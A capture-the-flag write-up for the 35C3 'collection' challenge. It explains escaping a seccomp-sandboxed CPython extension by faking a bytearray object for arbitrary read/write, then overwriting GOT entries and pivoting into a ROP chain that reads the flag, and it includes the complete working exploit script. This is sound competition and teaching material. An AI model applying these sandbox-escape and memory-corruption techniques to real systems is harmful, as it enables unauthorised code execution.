---
title: 35c3 collection write up
updated: 2019-01-02 19:54:37
tags: [writeup,reversing,pwn]
---


- [35c3 collection write up](#org28f36eb)
  - [Getting Arbitrary Read Write Primitive](#org304b5f3)
  - [Getting Code Execution](#org7c6608c)
  - [Reference](#org7d66a47)


<a id="org28f36eb"></a>

# 35c3 collection write up

> behold my collection
> 
> The container is built with the following important statements
> 
> FROM ubuntu:18.04 RUN apt-get -y install python3.6 COPY build/lib.linux-x86_64-3.6/Collection.cpython-36m-x86_64-linux-gnu.so /usr/local/lib/python3.6/dist-packages/Collection.cpython-36m-x86_64_-linux-gnu.so Copy the library in the same destination path and check that it works with
> 
> python3.6 test.py Challenge runs at 35.207.157.79:4444
> 
> Difficulty: easy

We are given following files

```sh
$ ls
Collection.cpython-36m-x86_64-linux-gnu.so  libc-2.27.so  python3.6  server.py  test.py
```

A custom build cpython module `Collection.cpython-36m-x86_64-linux-gnu.so`

`libc-2.27.so` and `python3.6` binary which are running on the server.

and `server.py`

```python
import os
import tempfile
import os
import string
import random

def randstr():
    return ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(10))


flag = open("flag", "r")


prefix = """
from sys import modules
del modules['os']
import Collection
keys = list(__builtins__.__dict__.keys())
for k in keys:
    if k != 'id' and k != 'hex' and k != 'print' and k != 'range':
        del __builtins__.__dict__[k]

"""


size_max = 20000

print("enter your code, enter the string END_OF_PWN on a single line to finish")


code = prefix
new = ""
finished = False

while size_max > len(code):
    new = raw_input("code> ")
    if new == "END_OF_PWN":
        finished = True
        break
    code += new + "\n"

if not finished:
    print("max length exceeded")
    sys.exit(42)


file_name = "/tmp/%s" % randstr()
with open(file_name, "w+") as f:
    f.write(code.encode())


os.dup2(flag.fileno(), 1023)
flag.close()

cmd = "python3.6 -u %s" % file_name
os.system(cmd)
```

The `server.py` file takes user input till we enter `END_OF_PWN` , then a temp python file is created with a prefix code and user input . The prefix code imports Collection module , and removes os module and all the builtin other than id, hex, print and range . This files is then executed with `python3.6 -u` command on the server . `-u` is for unbuffered i/o .

We are also given a `test.py` which shows a basic functionality of the Collection module.

```sh
$ ./python3.6 test.py
1337
[1.2]
{'a': 45545}
```

But when i tried to run the test.py with `python3.6 -i` it gave a error invalid system call

```python
$ ./python3.6 -i test.py
1337
[1.2]
{'a': 45545}
[1]    5181 invalid system call  ./python3.6 -i test.py
```

If you run strace on the python while importing the collection module we can see that they have actually implemented a seccomp filter.

```
...
prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)  = 0
prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, {len=99, filter=0x7fffffffb4a0}) = 0
....
```

So it might be using some blacklisted syscall while we use `-i` tag with python. We can see a init<sub>sandbox</sub> function in the binary which actually initialize the seccomp filter and this function is called inside `PyInit_Collection` . So we can just patch this call and we can load the module in interactive mode and test .

We can dump the seccomp filter using seccomp-tool

```sh
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0012
 0011: 0x05 0x00 0x00 0x00000011  goto 0029
 0012: 0x15 0x00 0x01 0x0000000b  if (A != munmap) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x00000019  if (A != mremap) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x00000013  if (A != readv) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x15 0x00 0x01 0x000000ca  if (A != futex) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x15 0x00 0x01 0x00000083  if (A != sigaltstack) goto 0022
 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0022: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0026
 0025: 0x05 0x00 0x00 0x00000037  goto 0081
 0026: 0x15 0x00 0x01 0x0000000d  if (A != rt_sigaction) goto 0028
 0027: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0028: 0x06 0x00 0x00 0x00000000  return KILL
 0029: 0x05 0x00 0x00 0x00000000  goto 0030
 0030: 0x20 0x00 0x00 0x00000010  A = args[0]
 0031: 0x02 0x00 0x00 0x00000000  mem[0] = A
 0032: 0x20 0x00 0x00 0x00000014  A = args[0] >> 32
 0033: 0x02 0x00 0x00 0x00000001  mem[1] = A
 0034: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0038
 0035: 0x60 0x00 0x00 0x00000000  A = mem[0]
 0036: 0x15 0x02 0x00 0x00000000  if (A == 0x0) goto 0039
 0037: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0038: 0x06 0x00 0x00 0x00000000  return KILL
 0039: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0040: 0x20 0x00 0x00 0x00000020  A = args[2]
 0041: 0x02 0x00 0x00 0x00000000  mem[0] = A
 0042: 0x20 0x00 0x00 0x00000024  A = args[2] >> 32
 0043: 0x02 0x00 0x00 0x00000001  mem[1] = A
 0044: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0048
 0045: 0x60 0x00 0x00 0x00000000  A = mem[0]
 0046: 0x15 0x02 0x00 0x00000003  if (A == 0x3) goto 0049
 0047: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0048: 0x06 0x00 0x00 0x00000000  return KILL
 0049: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0050: 0x20 0x00 0x00 0x00000028  A = args[3]
 0051: 0x02 0x00 0x00 0x00000000  mem[0] = A
 0052: 0x20 0x00 0x00 0x0000002c  A = args[3] >> 32
 0053: 0x02 0x00 0x00 0x00000001  mem[1] = A
 0054: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0058
 0055: 0x60 0x00 0x00 0x00000000  A = mem[0]
 0056: 0x15 0x02 0x00 0x00000022  if (A == 0x22) goto 0059
 0057: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0058: 0x06 0x00 0x00 0x00000000  return KILL
 0059: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0060: 0x20 0x00 0x00 0x00000030  A = args[4]
 0061: 0x02 0x00 0x00 0x00000000  mem[0] = A
 0062: 0x20 0x00 0x00 0x00000034  A = args[4] >> 32
 0063: 0x02 0x00 0x00 0x00000001  mem[1] = A
 0064: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0068
 0065: 0x60 0x00 0x00 0x00000000  A = mem[0]
 0066: 0x15 0x02 0x00 0xffffffff  if (A == 0xffffffff) goto 0069
 0067: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0068: 0x06 0x00 0x00 0x00000000  return KILL
 0069: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0070: 0x20 0x00 0x00 0x00000038  A = args[5]
 0071: 0x02 0x00 0x00 0x00000000  mem[0] = A
 0072: 0x20 0x00 0x00 0x0000003c  A = args[5] >> 32
 0073: 0x02 0x00 0x00 0x00000001  mem[1] = A
 0074: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0078
 0075: 0x60 0x00 0x00 0x00000000  A = mem[0]
 0076: 0x15 0x02 0x00 0x00000000  if (A == 0x0) goto 0079
 0077: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0078: 0x06 0x00 0x00 0x00000000  return KILL
 0079: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0080: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0081: 0x05 0x00 0x00 0x00000000  goto 0082
 0082: 0x20 0x00 0x00 0x00000010  A = args[0]
 0083: 0x02 0x00 0x00 0x00000000  mem[0] = A
 0084: 0x20 0x00 0x00 0x00000014  A = args[0] >> 32
 0085: 0x02 0x00 0x00 0x00000001  mem[1] = A
 0086: 0x15 0x00 0x05 0x00000000  if (A != 0x0) goto 0092
 0087: 0x60 0x00 0x00 0x00000000  A = mem[0]
 0088: 0x15 0x00 0x02 0x00000001  if (A != 0x1) goto 0091
 0089: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0090: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0091: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0092: 0x15 0x00 0x05 0x00000000  if (A != 0x0) goto 0098
 0093: 0x60 0x00 0x00 0x00000000  A = mem[0]
 0094: 0x15 0x00 0x02 0x00000002  if (A != 0x2) goto 0097
 0095: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0096: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0097: 0x60 0x00 0x00 0x00000001  A = mem[1]
 0098: 0x06 0x00 0x00 0x00000000  return KILL
```

As you can see they have implemented a whitelist filter which allows only `exit` , `exit_group` , `brk` , `mmap` , `munmap` , `readv` , `futex` , `signalstack` , `close` , `write` and `rt_sigaction` syscalls . And there are some check which restricts the arguments . I did not reverse that part .

We know that the flags file descriptor is `1023` , We can read the flag from this fd and print it into the screen . As described above the `read` syscall is blocked and but since the `readv` syscall is whitelist we can use the it syscall to read from the fd .

Let's seen which all functions are defined inside the collection module .

```python
>>> import Collection
>>> dir(Collection)
['Collection', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__']
>>> dir(Collection.Collection)
['__class__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__',
 '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__',
 '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__',
 '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'get']
```

As you can see only function defined is `get` .

```sh
$cat test.py 
import Collection

a = Collection.Collection({"a":1337, "b":[1.2], "c":{"a":45545}})

print(a.get("a"))
print(a.get("b"))
print(a.get("c"))
```

As shown above the `test.py` contains some example code which show's the functionality of the module . Basically we give a dictionary to the Collection, which is stored inside the object . The only constrain is that we can only give string as the key and the value should be either list , value or dictionary . Then we can retrieve the values stored from the collection with `get` member function .


<a id="org304b5f3"></a>

## Getting Arbitrary Read Write Primitive

Now our aim is to return a fake PyObject object such a way that we can get arbitrary read write primitive .

One tick I found online is to use bytearray.

```sh
pwndbg> p *(PyObject *)0x7ffff74afc38
$10 = {
  ob_refcnt = 1, 
  ob_type = 0x7d37e0 <PyByteArray_Type>
}
pwndbg> p *(PyByteArrayObject *)0x7ffff74afc38
$11 = {
  ob_base = {
    ob_base = {
      ob_refcnt = 1, 
      ob_type = 0x7d37e0 <PyByteArray_Type>
    }, 
    ob_size = 1
  }, 
  ob_alloc = 2, 
  ob_bytes = 0x7ffff76a1660 "a", 
  ob_start = 0x7ffff76a1660 "a", 
  ob_exports = 0
}
```

bytearray is a mutable object , We can fake this object with controlled `ob_start` and `ob_bytes` and get arbitrary read write primitive .

Now we need a space to fake our bytearray object ,

```python
>>> a = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"           
>>> hex(id(a))                           
'0x7ffff74b3088'
...
...
pwndbg> x/10gx 0x7ffff74b3088
0x7ffff74b3088: 0x0000000000000001      0x00000000007d6400
0x7ffff74b3098: 0x0000000000000023      0x15902057a8b86b36
0x7ffff74b30a8: 0x00000000007d00e5      0x0000000000000000
0x7ffff74b30b8: 0x4141414141414141      0x4141414141414141
0x7ffff74b30c8: 0x4141414141414141      0x4141414141414141
```

We can use the string object to create our fake bytearray object , Since they have whitelisted id and we can easily get the address of the string object and adding a offset will give our string.


<a id="org7c6608c"></a>

## Getting Code Execution

Now there are many possibility , and the one I took is to overwrite the got table and do a stack pivot to execute rop to read flag from `1023` and call write to print the flag to screen.

Since we can use print function and we can also give a string as a argument this seems to be a good candidate . Let's check which function is executed when print is called

```sh
$ cat test.py
print("AAAAAAAAAAAAAAAAAA")

$ gdb --args ./python3.6 -u test.py
pwndbg> catch syscall 1                            
Catchpoint 1 (syscall 'write' [1])                             
pwndbg> r  
...
pwndbg> bt
#0  0x00007ffff7ec6874 in __GI___libc_write (fd=1, buf=0x7ffff74af360, nbytes=19) at ../sysdeps/unix/sysv/linux/write.c:26                            
#1  0x00000000004c1858 in ?? ()
#2  0x0000000000565bd1 in _PyCFunction_FastCallDict ()
#3  0x00000000005a3761 in _PyObject_FastCallDict ()
#4  0x00000000005a3a5e in PyObject_CallMethodObjArgs ()
...
...
pwndbg> x/10i 0x00000000004c1858 - 0x20
   0x4c1838:    add    BYTE PTR [rcx-0x77],cl
   0x4c183b:    (bad)
   0x4c183c:    call   0x420050 <__errno_location@plt>
   0x4c1841:    mov    rdx,rbx
   0x4c1844:    mov    rsi,r14
   0x4c1847:    mov    edi,r12d
   0x4c184a:    mov    DWORD PTR [rax],0x0
   0x4c1850:    mov    rbp,rax
   0x4c1853:    call   0x4207e0 <write@plt>
```

As shown above the write function is called when print is called , The write function is called with our string as the second argument and size of the string as the third argument . We were able to pivot the stack to that string . But python3.6 byte string we messing up our payload . Later were able to find some gadget to pivot the stack to a know location by overwriting both errno<sub>location</sub>'s and writes got with gadget.

After we achieve stack pivot we just need to create a rop chain to call readv(1023, \*iov, 1) then call write syscall to print the flag

```python
import Collection

alp = {'00': b'\x00',
 '01': b'\x01',
 '02': b'\x02',
 '03': b'\x03',
 '04': b'\x04',
 '05': b'\x05',
 '06': b'\x06',
 '07': b'\x07',
 '08': b'\x08',
 '09': b'\t',
 '0a': b'\n',
 '0b': b'\x0b',
 '0c': b'\x0c',
 '0d': b'\r',
 '0e': b'\x0e',
 '0f': b'\x0f',
 '10': b'\x10',
 '11': b'\x11',
 '12': b'\x12',
 '13': b'\x13',
 '14': b'\x14',
 '15': b'\x15',
 '16': b'\x16',
 '17': b'\x17',
 '18': b'\x18',
 '19': b'\x19',
 '1a': b'\x1a',
 '1b': b'\x1b',
 '1c': b'\x1c',
 '1d': b'\x1d',
 '1e': b'\x1e',
 '1f': b'\x1f',
 '20': b' ',
 '21': b'!',
 '22': b'"',
 '23': b'#',
 '24': b'$',
 '25': b'%',
 '26': b'&',
 '27': b"'",
 '28': b'(',
 '29': b')',
 '2a': b'*',
 '2b': b'+',
 '2c': b',',
 '2d': b'-',
 '2e': b'.',
 '2f': b'/',
 '30': b'0',
 '31': b'1',
 '32': b'2',
 '33': b'3',
 '34': b'4',
 '35': b'5',
 '36': b'6',
 '37': b'7',
 '38': b'8',
 '39': b'9',
 '3a': b':',
 '3b': b';',
 '3c': b'<',
 '3d': b'=',
 '3e': b'>',
 '3f': b'?',
 '40': b'@',
 '41': b'A',
 '42': b'B',
 '43': b'C',
 '44': b'D',
 '45': b'E',
 '46': b'F',
 '47': b'G',
 '48': b'H',
 '49': b'I',
 '4a': b'J',
 '4b': b'K',
 '4c': b'L',
 '4d': b'M',
 '4e': b'N',
 '4f': b'O',
 '50': b'P',
 '51': b'Q',
 '52': b'R',
 '53': b'S',
 '54': b'T',
 '55': b'U',
 '56': b'V',
 '57': b'W',
 '58': b'X',
 '59': b'Y',
 '5a': b'Z',
 '5b': b'[',
 '5c': b'\\',
 '5d': b']',
 '5e': b'^',
 '5f': b'_',
 '60': b'`',
 '61': b'a',
 '62': b'b',
 '63': b'c',
 '64': b'd',
 '65': b'e',
 '66': b'f',
 '67': b'g',
 '68': b'h',
 '69': b'i',
 '6a': b'j',
 '6b': b'k',
 '6c': b'l',
 '6d': b'm',
 '6e': b'n',
 '6f': b'o',
 '70': b'p',
 '71': b'q',
 '72': b'r',
 '73': b's',
 '74': b't',
 '75': b'u',
 '76': b'v',
 '77': b'w',
 '78': b'x',
 '79': b'y',
 '7a': b'z',
 '7b': b'{',
 '7c': b'|',
 '7d': b'}',
 '7e': b'~',
 '7f': b'\x7f',
 '80': b'\x80',
 '81': b'\x81',
 '82': b'\x82',
 '83': b'\x83',
 '84': b'\x84',
 '85': b'\x85',
 '86': b'\x86',
 '87': b'\x87',
 '88': b'\x88',
 '89': b'\x89',
 '8a': b'\x8a',
 '8b': b'\x8b',
 '8c': b'\x8c',
 '8d': b'\x8d',
 '8e': b'\x8e',
 '8f': b'\x8f',
 '90': b'\x90',
 '91': b'\x91',
 '92': b'\x92',
 '93': b'\x93',
 '94': b'\x94',
 '95': b'\x95',
 '96': b'\x96',
 '97': b'\x97',
 '98': b'\x98',
 '99': b'\x99',
 '9a': b'\x9a',
 '9b': b'\x9b',
 '9c': b'\x9c',
 '9d': b'\x9d',
 '9e': b'\x9e',
 '9f': b'\x9f',
 'a0': b'\xa0',
 'a1': b'\xa1',
 'a2': b'\xa2',
 'a3': b'\xa3',
 'a4': b'\xa4',
 'a5': b'\xa5',
 'a6': b'\xa6',
 'a7': b'\xa7',
 'a8': b'\xa8',
 'a9': b'\xa9',
 'aa': b'\xaa',
 'ab': b'\xab',
 'ac': b'\xac',
 'ad': b'\xad',
 'ae': b'\xae',
 'af': b'\xaf',
 'b0': b'\xb0',
 'b1': b'\xb1',
 'b2': b'\xb2',
 'b3': b'\xb3',
 'b4': b'\xb4',
 'b5': b'\xb5',
 'b6': b'\xb6',
 'b7': b'\xb7',
 'b8': b'\xb8',
 'b9': b'\xb9',
 'ba': b'\xba',
 'bb': b'\xbb',
 'bc': b'\xbc',
 'bd': b'\xbd',
 'be': b'\xbe',
 'bf': b'\xbf',
 'c0': b'\xc0',
 'c1': b'\xc1',
 'c2': b'\xc2',
 'c3': b'\xc3',
 'c4': b'\xc4',
 'c5': b'\xc5',
 'c6': b'\xc6',
 'c7': b'\xc7',
 'c8': b'\xc8',
 'c9': b'\xc9',
 'ca': b'\xca',
 'cb': b'\xcb',
 'cc': b'\xcc',
 'cd': b'\xcd',
 'ce': b'\xce',
 'cf': b'\xcf',
 'd0': b'\xd0',
 'd1': b'\xd1',
 'd2': b'\xd2',
 'd3': b'\xd3',
 'd4': b'\xd4',
 'd5': b'\xd5',
 'd6': b'\xd6',
 'd7': b'\xd7',
 'd8': b'\xd8',
 'd9': b'\xd9',
 'da': b'\xda',
 'db': b'\xdb',
 'dc': b'\xdc',
 'dd': b'\xdd',
 'de': b'\xde',
 'df': b'\xdf',
 'e0': b'\xe0',
 'e1': b'\xe1',
 'e2': b'\xe2',
 'e3': b'\xe3',
 'e4': b'\xe4',
 'e5': b'\xe5',
 'e6': b'\xe6',
 'e7': b'\xe7',
 'e8': b'\xe8',
 'e9': b'\xe9',
 'ea': b'\xea',
 'eb': b'\xeb',
 'ec': b'\xec',
 'ed': b'\xed',
 'ee': b'\xee',
 'ef': b'\xef',
 'f0': b'\xf0',
 'f1': b'\xf1',
 'f2': b'\xf2',
 'f3': b'\xf3',
 'f4': b'\xf4',
 'f5': b'\xf5',
 'f6': b'\xf6',
 'f7': b'\xf7',
 'f8': b'\xf8',
 'f9': b'\xf9',
 'fa': b'\xfa',
 'fb': b'\xfb',
 'fc': b'\xfc',
 'fd': b'\xfd',
 'fe': b'\xfe',
 'ff': b'\xff'}

def p64(a):
    a=hex(a)[2:].rjust(16,'0')
    li = [a[i:i+2] for i in range(0,16,2)]
    st=b''
    for i in li:
        st+=alp[i]
    return st[::-1]

def fake_bytearray(addr,size):

    payload =  p64(0xffff)
    payload += p64(0x00000000009ce7e0)
    payload += p64(size)
    payload += p64(size+1)
    payload += p64(addr)
    payload += p64(addr)
    payload += p64(0x0)
    return payload

def write(addr,inp):
    payload = fake_bytearray(addr,len(inp))
    payload_addr  = id(payload)
    a = Collection.Collection({"A":1337,"B":[1]})
    b = Collection.Collection({"B":[1],"A":payload_addr + 0x20})
    c = b.get("B")
    for i in range(len(inp)):
        c[i]=inp[i]


target = "\x00" * 0x100
iov=p64(id(target)+0x30)+p64(0x100)

pop_rdi = 0x00421612
pop_rsi = 0x0042110e
pop_rdx = 0x004026c1
pop_rax = 0x00631caf

readv_plt = 0x4208b0
syscall   = 0x0049d6d4

read_payload  = p64(pop_rdi)
read_payload += p64(1023)
read_payload += p64(pop_rsi)
read_payload += p64(id(iov)+0x20)
read_payload += p64(pop_rdx)
read_payload += p64(0x1)
read_payload += p64(readv_plt)

write_payload  = p64(pop_rdi)
write_payload += p64(1)
write_payload += p64(pop_rsi)
write_payload += p64(id(target)+0x30)
write_payload += p64(pop_rdx)
write_payload += p64(50)
write_payload += p64(pop_rax)
write_payload += p64(1)
write_payload += p64(syscall)

rop  = read_payload
rop += write_payload


stack_pviot = 0xa42f30
write(stack_pviot,rop)

# 0x0000000000467123 : leave ; ret
leave_ret = 0x00467123 
write_plt = 0x009b3d18

write(write_plt,p64(leave_ret))

# 0x000000000061233e: mov rax, rcx; ret;
mov_rax_rcx = 0x0061233e 
__errno_location = 0x009b3950

write(__errno_location,p64(mov_rax_rcx))

print("A" * (stack_pviot - 8))
```


<a id="org7d66a47"></a>

## Reference

[ 1 ] [python-sandbox-escape-via-a-memory-corruption-bug](https://hackernoon.com/python-sandbox-escape-via-a-memory-corruption-bug-19dde4d5fea5)

[ 2 ] [Extending Python with C or C++](https://docs.python.org/3/extending/extending.html)
